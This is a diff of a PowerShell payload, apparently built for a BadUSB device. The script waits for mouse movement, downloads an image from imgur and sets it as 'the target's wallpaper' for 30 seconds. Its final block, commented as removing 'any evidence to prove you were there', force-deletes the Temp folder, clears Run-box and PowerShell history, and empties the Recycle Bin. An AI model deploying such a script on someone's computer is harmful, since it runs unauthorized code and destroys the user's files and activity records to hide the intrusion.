@@ -19,24 +19,27 @@
 
 <#
 .NOTES
-	This script can be run as is with the provided execution file
+    This script can be run as is with the provided execution file
 .DESCRIPTION 
-	This script will download a specific image and change the wallpaper for 30 seconds before reverting to the original wallpaper.
+    This script will download a specific image and change the wallpaper for 30 seconds before reverting to the original wallpaper.
 #>
 
 ############################################################################################################################################################
 
 # Download the specific image
 $imageUrl = "https://i.imgur.com/j79rMvu.png"
+$imagePath = "$env:TMP\i.png"
+Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath
 
-iwr $imageUrl -O $env:TMP\i.png
+# Get the current wallpaper path
+$currentWallpaper = (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper).Wallpaper
 
 #----------------------------------------------------------------------------------------------------
 
 <#
 
 .NOTES 
-	This will take the image you downloaded and set it as the target's wallpaper
+    This will take the image you downloaded and set it as the target's wallpaper
 #>
 
 Function Set-WallPaper {
@@ -121,7 +124,7 @@ public class Params
 <#
 
 .NOTES 
-	This is to pause the script until a mouse movement is detected
+    This is to pause the script until a mouse movement is detected
 #>
 
 function Pause-Script{
@@ -143,13 +146,14 @@ $o=New-Object -ComObject WScript.Shell
 #----------------------------------------------------------------------------------------------------
 
 Pause-Script
+
+# Set the new wallpaper
 Set-WallPaper -Image "$env:TMP\i.png" -Style Center
 
 # Wait for 30 seconds before reverting the wallpaper
 Start-Sleep -Seconds 30
 
 # Revert to the original wallpaper
-$currentWallpaper = (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper).Wallpaper
 Set-WallPaper -Image $currentWallpaper -Style Center
 
 #----------------------------------------------------------------------------------------------------
@@ -157,29 +161,24 @@ Set-WallPaper -Image $currentWallpaper -Style Center
 <#
 
 .NOTES 
-	This is to clean up behind you and remove any evidence to prove you were there
+    This is to clean up behind you and remove any evidence to prove you were there
 #>
 
 # Delete contents of Temp folder 
-
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 # Delete run box history
-
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
-# Delete powershell history
-
+# Delete PowerShell history
 Remove-Item (Get-PSreadlineOption).HistorySavePath
 
-# Deletes contents of recycle bin
-
+# Delete contents of recycle bin
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 #----------------------------------------------------------------------------------------------------
 
 # This script repeatedly presses the capslock button, this snippet will make sure capslock is turned back off 
-
 Add-Type -AssemblyName System.Windows.Forms
 $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
 
